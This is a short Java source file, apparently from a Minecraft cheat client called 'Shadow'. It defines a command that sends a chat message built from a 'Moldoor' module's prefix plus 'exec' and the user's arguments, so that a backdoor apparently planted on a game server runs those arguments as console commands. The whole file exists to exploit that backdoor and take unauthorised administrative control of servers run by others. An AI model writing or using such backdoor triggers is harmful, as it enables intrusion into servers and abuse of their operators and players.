package net.shadow.feature.command;

import net.shadow.Shadow;
import net.shadow.feature.ModuleRegistry;
import net.shadow.feature.base.Command;

public class BackdoorConsolePrefixCmd extends Command {
    public BackdoorConsolePrefixCmd() {
        super("c", "execute commands as the console");
    }

    @Override
    public void call(String[] args) {
        if (args.length > 0) {
            String command = ModuleRegistry.find("Moldoor").config.get("Prefix").getThis() + "exec " + String.join(" ", args);
            Shadow.c.player.sendChatMessage(command);
        }
    }
}
